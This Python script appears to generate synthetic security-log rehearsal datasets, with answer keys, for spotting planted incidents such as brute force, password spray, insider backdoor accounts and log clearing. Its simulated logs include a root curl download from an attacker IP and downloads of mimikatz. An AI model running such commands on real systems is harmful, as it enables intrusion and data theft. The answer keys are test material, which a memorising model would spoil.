"""Build rehearsal datasets that look like what an examiner might hand over on the spot.

    python docs/data/make_rehearsal.py      # writes docs/data/*.zip and answer keys

Pack A - "corporate_siem_export.zip" (a different simulated company, seed 2027):
    events.csv          logins, file access and web traffic MIXED in one table, told apart by an
                        EventType column; unfamiliar column names; DOMAIN\\USER accounts in capitals
    host_metrics.jsonl  CPU and memory as 0-1 fractions with epoch-millisecond timestamps
    staff.json          the user directory as a JSON array (login, dept, admin yes/no)
    -> answer_key_A.csv (who / when / what) is kept outside the zip.

Pack B - "server_logs.zip" (60 days, 25 people, written from scratch here):
    auth.log            raw Linux syslog of a bastion host: sshd logins, sudo, su, useradd
    Security.csv        Windows Event Viewer "Save All Events As" export of the domain controller
                        (4624 / 4625 logons, 4688 process starts, 4720 account created, 1102 log cleared)
    access.log          Squid web-proxy log (SSL inspection on, so full page URLs are visible): pages,
                        downloads and TCP_DENIED blocks for everyone
    -> answer_key_B.csv
"""
from __future__ import annotations

import copy
import io
import json
import random
import sys
import zipfile
from datetime import datetime, timedelta
from pathlib import Path

import pandas as pd

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
OUT = Path(__file__).resolve().parent


# ================================================================ pack A
def pack_a():
    from ueba.config import CONFIG
    from ueba.generator import generate_dataset
    tmp = OUT / "_tmp_a"
    cfg = copy.deepcopy(CONFIG)
    cfg.seed = 2027
    generate_dataset(tmp, cfg)
    auth, acc, net = (pd.read_csv(tmp / f"{s}.csv") for s in ("auth", "access", "network"))
    res, users, truth = pd.read_csv(tmp / "resource.csv"), pd.read_csv(tmp / "users.csv"), pd.read_csv(tmp / "ground_truth.csv")

    def acct(u):
        return "CORP\\" + str(u).upper()

    ev = pd.concat([
        pd.DataFrame({"EventTime": pd.to_datetime(auth.timestamp).dt.strftime("%Y-%m-%dT%H:%M:%SZ"),
                      "EventType": auth.result.map({"success": "Logon Success", "failure": "Logon Failure"}),
                      "Account": auth.user.map(acct), "Host": auth.src_device, "SrcAddress": auth.src_ip,
                      "Target": auth.dest_host, "Method": auth.auth_type, "Outcome": auth.result.str.title(),
                      "City": auth.city, "Country": auth.country, "Latitude": auth.lat, "Longitude": auth.lon}),
        pd.DataFrame({"EventTime": pd.to_datetime(acc.timestamp).dt.strftime("%Y-%m-%dT%H:%M:%SZ"),
                      "EventType": acc.action.map(lambda a: "Privilege Use" if a == "priv_escalation" else "File Access"),
                      "Account": acc.user.map(acct), "Host": acc.device, "Target": acc.resource,
                      "Operation": acc.action.str.upper(), "Classification": acc.sensitivity.str.title(),
                      "Outcome": acc.status.str.title()}),
        pd.DataFrame({"EventTime": pd.to_datetime(net.timestamp).dt.strftime("%Y-%m-%dT%H:%M:%SZ"),
                      "EventType": "Web Request", "Account": net.user.map(acct), "Host": net.device,
                      "SrcAddress": net.src_ip, "DestAddress": net.dst_ip, "DestPort": net.dst_port,
                      "Target": "https://" + net.domain.astype(str) + "/", "BytesOut": net.bytes_out,
                      "BytesIn": net.bytes_in, "Outcome": "Success"}),
    ], ignore_index=True).sort_values("EventTime")
    metrics = pd.DataFrame({"ts": (pd.to_datetime(res.timestamp).astype("int64") // 10**6),
                            "machine": res.device, "owner": res.user, "cpu_util": (res.cpu_pct / 100).round(4),
                            "mem_util": (res.mem_pct / 100).round(4), "disk_mb": res.disk_io_mb, "procs": res.process_count})
    staff = [dict(login=u.user, display=u.full_name, dept=u.department, admin="yes" if str(u.is_admin) == "True" else "no",
                  laptop=u.device) for u in users.itertuples()]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("events.csv", ev.to_csv(index=False))
        z.writestr("host_metrics.jsonl", metrics.to_json(orient="records", lines=True))
        z.writestr("staff.json", json.dumps(staff, indent=1))
    (OUT / "corporate_siem_export.zip").write_bytes(buf.getvalue())
    truth.rename(columns={"entity": "who", "date": "when", "scenario": "what"})[["who", "when", "what", "incident_id"]] \
        .to_csv(OUT / "answer_key_A.csv", index=False)
    for f in tmp.glob("*"):
        f.unlink()
    tmp.rmdir()
    print(f"pack A: {len(ev):,} mixed events, {len(metrics):,} metric samples, {len(staff)} staff")


# ================================================================ pack B
def pack_b(seed: int = 11):
    rng = random.Random(seed)
    start = datetime(2026, 5, 1)
    people = [f"{n}" for n in ("arun", "bela", "chris", "deepa", "eshan", "farah", "gopal", "hema", "imran", "jaya",
                                "kiran", "leela", "manoj", "neha", "omar", "priya", "qadir", "rhea", "sahil", "tara",
                                "uday", "vani", "wasim", "xena", "yash")]
    admins = {"arun", "farah", "omar"}
    office = {p: f"10.20.{rng.randint(1, 9)}.{rng.randint(10, 250)}" for p in people}
    shift = {p: rng.choice([(8, 17), (9, 18), (10, 19)]) for p in people}
    syslog, win, truth = [], [], []

    def sys_line(ts, prog, msg, host="bastion01"):
        syslog.append((ts, f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} {host} {prog}[{rng.randint(1000, 65000)}]: {msg}"))

    def evt(ts, eid, kw, cat, body):
        win.append((ts, ["Audit Failure" if kw == "fail" else "Audit Success", ts.strftime("%-m/%-d/%Y %-I:%M:%S %p"),
                         "Microsoft-Windows-Security-Auditing", str(eid), cat, body]))

    def logon_body(user, ws, ip, ltype, ok=True):
        head = "An account was successfully logged on." if ok else "An account failed to log on."
        block = "New Logon:" if ok else "Account For Which Logon Failed:"
        return (f"{head}\n\nSubject:\n\tSecurity ID:\t\tSYSTEM\n\tAccount Name:\t\tDC01$\n\tAccount Domain:\t\tCORP\n\n"
                f"Logon Information:\n\tLogon Type:\t\t{ltype}\n\n{block}\n\tSecurity ID:\t\tCORP\\{user}\n"
                f"\tAccount Name:\t\t{user}\n\tAccount Domain:\t\tCORP\n\nNetwork Information:\n"
                f"\tWorkstation Name:\t{ws}\n\tSource Network Address:\t{ip}\n\tSource Port:\t\t{rng.randint(49152, 65000)}\n")

    for d in range(60):
        day = start + timedelta(days=d)
        if day.weekday() >= 5:
            continue
        for p in people:
            if rng.random() < 0.08:
                continue                                       # leave / sick
            h0, h1 = shift[p]
            t = day + timedelta(hours=h0, minutes=rng.randint(0, 50))
            evt(t, 4624, "ok", "Logon", logon_body(p, f"LT-{p.upper()}", office[p], 2))
            if rng.random() < 0.06:                            # mistyped password first
                evt(t - timedelta(seconds=20), 4625, "fail", "Logon", logon_body(p, f"LT-{p.upper()}", office[p], 2, ok=False))
            if p in admins or rng.random() < 0.35:             # some people use the bastion
                for _ in range(rng.randint(1, 3)):
                    ts = day + timedelta(hours=rng.randint(h0, h1 - 1), minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
                    sys_line(ts, "sshd", f"Accepted publickey for {p} from {office[p]} port {rng.randint(40000, 60000)} ssh2: RSA SHA256:x")
                    if p in admins and rng.random() < 0.5:
                        sys_line(ts + timedelta(minutes=3), "sudo", f"{p} : TTY=pts/0 ; PWD=/home/{p} ; USER=root ; "
                                 f"COMMAND=/usr/bin/{rng.choice(['systemctl restart nginx', 'apt update', 'journalctl -u app'])}")
            if rng.random() < 0.5:
                evt(t + timedelta(minutes=rng.randint(5, 300)), 4688, "ok", "Process Creation",
                    f"A new process has been created.\n\nSubject:\n\tSecurity ID:\t\tCORP\\{p}\n\tAccount Name:\t\t{p}\n"
                    f"\tAccount Domain:\t\tCORP\n\nProcess Information:\n\tNew Process Name:\tC:\\Program Files\\Office\\"
                    f"{rng.choice(['WINWORD.EXE', 'EXCEL.EXE', 'OUTLOOK.EXE'])}\n")
        # background internet noise against the bastion (scanners)
        for _ in range(rng.randint(0, 3)):
            ts = day + timedelta(hours=rng.randint(0, 23), minutes=rng.randint(0, 59))
            sys_line(ts, "sshd", f"Failed password for invalid user {rng.choice(['admin', 'test', 'oracle', 'ubuntu'])} "
                     f"from 185.{rng.randint(1, 250)}.{rng.randint(1, 250)}.{rng.randint(1, 250)} port 4{rng.randint(1000, 9999)} ssh2")

    # ---- incidents (days 38-55) ----
    d1 = start + timedelta(days=40, hours=2, minutes=13)      # brute force then success on hema, from abroad
    for i in range(40):
        sys_line(d1 + timedelta(seconds=7 * i), "sshd", f"Failed password for hema from 45.155.205.99 port {50000 + i} ssh2")
    sys_line(d1 + timedelta(minutes=5), "sshd", "Accepted password for hema from 45.155.205.99 port 50100 ssh2")
    sys_line(d1 + timedelta(minutes=7), "sudo", "hema : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/x http://45.155.205.99/x")
    truth.append(("hema", str(d1.date()), "ssh brute force then root"))

    d2 = start + timedelta(days=46, hours=23, minutes=40)     # insider: late-night root and a backdoor account
    sys_line(d2, "sshd", f"Accepted publickey for manoj from {office['manoj']} port 51234 ssh2")
    sys_line(d2 + timedelta(minutes=2), "su", "pam_unix(su:session): session opened for user root by manoj(uid=1012)")
    sys_line(d2 + timedelta(minutes=4), "useradd", "new user: name=svc_backup2, UID=1099, GID=1099, home=/home/svc_backup2, shell=/bin/bash")
    sys_line(d2 + timedelta(minutes=6), "sudo", "manoj : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/db.tgz /var/lib/db")
    truth.append(("manoj", str(d2.date()), "insider root + backdoor account"))

    d3 = start + timedelta(days=50, hours=3, minutes=5)       # password spray on the domain controller
    for i, p in enumerate(people[:18]):
        evt(d3 + timedelta(seconds=12 * i), 4625, "fail", "Logon", logon_body(p, "UNKNOWN-PC", "91.214.124.7", 3, ok=False))
    evt(d3 + timedelta(minutes=5), 4624, "ok", "Logon", logon_body("vani", "UNKNOWN-PC", "91.214.124.7", 3))
    truth.append(("vani", str(d3.date()), "password spray, account taken over"))

    d4 = start + timedelta(days=53, hours=1, minutes=30)      # compromised account creates admin user, clears log
    evt(d4, 4624, "ok", "Logon", logon_body("yash", "LT-YASH", "10.20.9.200", 10))
    evt(d4 + timedelta(minutes=3), 4720, "ok", "User Account Management",
        "A user account was created.\n\nSubject:\n\tSecurity ID:\t\tCORP\\yash\n\tAccount Name:\t\tyash\n\n"
        "New Account:\n\tSecurity ID:\t\tCORP\\helpdesk2\n\tAccount Name:\t\thelpdesk2\n")
    evt(d4 + timedelta(minutes=4), 4732, "ok", "Security Group Management",
        "A member was added to a security-enabled local group.\n\nSubject:\n\tSecurity ID:\t\tCORP\\yash\n\tAccount Name:\t\tyash\n\n"
        "Member:\n\tSecurity ID:\t\tCORP\\helpdesk2\n\tAccount Name:\t\thelpdesk2\n\nGroup:\n\tGroup Name:\t\tAdministrators\n")
    evt(d4 + timedelta(minutes=9), 1102, "ok", "Log clear",
        "The audit log was cleared.\nSubject:\n\tSecurity ID:\tCORP\\yash\n\tAccount Name:\tyash\n")
    truth.append(("yash", str(d4.date()), "account created + audit log cleared"))

    proxy = proxy_log(people, office, shift, start, truth, seed)

    syslog.sort()
    win.sort(key=lambda r: r[0])
    out = io.StringIO()
    import csv
    w = csv.writer(out)
    w.writerow(["Keywords", "Date and Time", "Source", "Event ID", "Task Category"])
    for _, row in reversed(win):                              # Event Viewer lists newest first
        w.writerow(row)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("auth.log", "\n".join(line for _, line in syslog) + "\n")
        z.writestr("Security.csv", out.getvalue())
        z.writestr("access.log", "\n".join(proxy) + "\n")
    (OUT / "server_logs.zip").write_bytes(buf.getvalue())
    pd.DataFrame(truth, columns=["who", "when", "what"]).to_csv(OUT / "answer_key_B.csv", index=False)
    print(f"pack B: {len(syslog):,} syslog lines, {len(win):,} Windows events, {len(proxy):,} proxy requests, "
          f"{len(truth)} incidents")


SITES = {"https://outlook.office365.com/mail/inbox": 5, "https://teams.microsoft.com/v2/": 4,
         "https://www.google.com/search?q={w}": 3, "https://stackoverflow.com/questions/{n}/{w}": 2,
         "https://github.com/corp/{w}/pull/{n}": 2, "https://corp.atlassian.net/browse/OPS-{n}": 2,
         "https://www.linkedin.com/feed/": 1, "https://economictimes.indiatimes.com/markets/{w}": 1,
         "https://docs.python.org/3/library/{w}.html": 1, "https://www.icicibank.com/corporate/payments/{n}": 1}
WORDS = ["deploy", "invoice", "timeout", "nginx", "payroll", "backup", "pandas", "docker", "budget", "report"]
POLICY = ["www.netflix.com", "www.hotstar.com", "www.bet365.com", "store.steampowered.com", "www.twitch.tv"]


def proxy_log(people, office, shift, start, truth, seed):
    """Squid native access.log lines. A separate random stream, so the other files are unchanged."""
    rng = random.Random(seed + 5)
    rows = []
    epoch = datetime(1970, 1, 1)

    def line(ts, ip, code, size, method, url, user, peer, ctype):
        rows.append((ts, f"{(ts - epoch).total_seconds():.3f} {rng.randint(20, 900):6d} {ip} {code} {size} {method} "
                         f"{url} {user} {peer} {ctype}"))

    urls, weights = list(SITES), list(SITES.values())
    for d in range(60):
        day = start + timedelta(days=d)
        if day.weekday() >= 5:
            continue
        for p in people:
            if rng.random() < 0.08:
                continue
            h0, h1 = shift[p]
            for _ in range(rng.randint(25, 60)):
                ts = day + timedelta(hours=rng.uniform(h0, h1))
                url = rng.choices(urls, weights)[0].format(w=rng.choice(WORDS), n=rng.randint(1000, 99999))
                line(ts, office[p], "TCP_MISS/200", rng.randint(2_000, 400_000), "GET", url, p,
                     "DIRECT/142.250.1.1", "text/html")
            if rng.random() < 0.04:                               # an occasional document download
                ts = day + timedelta(hours=rng.uniform(h0, h1))
                line(ts, office[p], "TCP_MISS/200", rng.randint(200_000, 4_000_000), "GET",
                     f"https://outlook.office365.com/attachments/{rng.choice(WORDS)}_{rng.randint(1, 99)}.pdf", p,
                     "DIRECT/52.96.1.1", "application/pdf")
            if rng.random() < 0.10:                               # everyday web-filter hit
                site = rng.choice(POLICY)
                ts = day + timedelta(hours=rng.uniform(h0, h1))
                line(ts, office[p], "TCP_DENIED/403", 3900, "GET", f"https://{site}/", p, "HIER_NONE/-", "text/html")

    # ---- incident 5: blocked from file-sharing, gets round the filter with a web proxy, pulls hacking tools
    d5 = start + timedelta(days=47, hours=15, minutes=10)
    ip = office["rhea"]
    for i, site in enumerate(["anonfiles.io", "file.io", "transfer.sh", "anonfiles.io", "pastebin.com", "file.io"]):
        line(d5 + timedelta(minutes=2 * i), ip, "TCP_DENIED/403", 3900, "GET", f"https://{site}/upload", "rhea",
             "HIER_NONE/-", "text/html")
    line(d5 + timedelta(minutes=15), ip, "TCP_MISS/200", 88_000, "GET", "https://www.croxyproxy.com/", "rhea",
         "DIRECT/104.21.3.3", "text/html")
    line(d5 + timedelta(minutes=18), ip, "TCP_MISS/200", 31_000_000, "GET", "https://nmap.org/dist/nmap-7.94-setup.exe",
         "rhea", "DIRECT/45.33.49.119", "application/octet-stream")
    line(d5 + timedelta(minutes=20), ip, "TCP_MISS/200", 1_200_000, "GET",
         "https://gentilkiwi.com/downloads/mimikatz_trunk.zip", "rhea", "DIRECT/51.15.4.4", "application/zip")
    truth.append(("rhea", str(d5.date()), "blocked from file-sharing, web proxy to bypass, hacking tools downloaded"))
    rows.sort()
    return [r for _, r in rows]


if __name__ == "__main__":
    pack_a()
    pack_b()
